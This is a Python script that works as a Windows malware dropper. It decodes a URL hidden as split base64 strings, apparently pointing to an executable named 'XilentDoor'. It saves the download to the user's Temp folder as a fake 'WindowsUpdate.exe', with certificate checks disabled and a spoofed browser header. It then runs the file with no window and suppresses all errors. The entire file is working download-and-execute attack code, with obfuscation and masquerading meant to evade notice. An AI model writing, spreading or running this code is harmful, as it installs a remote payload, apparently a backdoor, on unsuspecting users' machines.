import os
import requests
import subprocess
import getpass

def decode_url():
    # Strings rotados y divididos
    # Aquí deben
    parts = [
        "aHR0cHM6Ly9naXRodWIuY29tL",
        "1IzTEk0TlQvWGlsZW50RG9vci9",
        "yZWxlYXNlcy9kb3dubG9hZC94a",
        "WxlbnQvWGlsZW50RG9vci5leGU="
    ]
    
    encoded = ""
    for p in parts:
        encoded += p
    
    # Decodificación 
    import base64
    return base64.b64decode(encoded).decode('utf-8')

def get_target_path():
    user = getpass.getuser()
    
    # Ruta en partes
    drive = "C:"
    users_dir = "\\Users\\"
    appdata = "\\AppData\\Local\\Temp\\"
    filename = "Win" + "dows" + "Update" + ".exe"
    
    return drive + users_dir + user + appdata + filename

def download_file(url, path):
    headers = {
        'User-Agent': 'Mozilla/5.0' + ' (Windows NT 10.0; Win64; x64) ' + 
                     'AppleWebKit/537.36 ' + '(KHTML, like Gecko) ' + 
                     'Chrome/91.0.4472.124 ' + 'Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    response = requests.get(url, headers=headers, timeout=60, verify=False)
    
    if response.status_code == 200:
        with open(path, 'wb') as f:
            f.write(response.content)
        return True
    return False

def execute_silently(path):
    no_window = 0x08000000  # CREATE_NO_WINDOW
    detached = 0x00000008   # DETACHED_PROCESS
    
    try:
        subprocess.Popen(
            [path],
            creationflags=no_window | detached,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            shell=False
        )
        return True
    except:
        return False

def main():
    try:
        url = decode_url()
        path = get_target_path()
        
        if download_file(url, path):
            execute_silently(path)
            
    except:
        pass

if __name__ == "__main__":
    main()